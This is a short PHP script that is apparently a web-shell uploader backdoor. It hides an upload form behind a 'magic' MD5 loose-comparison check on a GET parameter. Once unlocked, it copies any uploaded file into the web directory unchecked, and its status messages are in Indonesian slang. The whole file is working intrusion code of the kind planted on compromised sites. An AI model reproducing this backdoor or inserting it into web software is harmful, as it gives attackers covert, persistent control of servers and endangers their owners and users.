<?php
if (isset($_GET["nm"])) {
    if (hash("md5", $_GET["nm"]) == $_GET["nm"]) {
        echo 'NowMeee <form action="" method="post" enctype="multipart/form-data" name="u" id="u">';
        echo '<input type="file" name="file" size="50"><input name="u_u" type="submit" id="u_u" value="Upload"></form>';
        if ($_POST['u_u'] == "Upload") {
            if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
                echo '<b>done cok</b><br><br>';
            } else {
                echo '<b>GK BISA AJG</b><br><br>';
            }
        }
    } else {
        echo "?!";
    }
}
?>

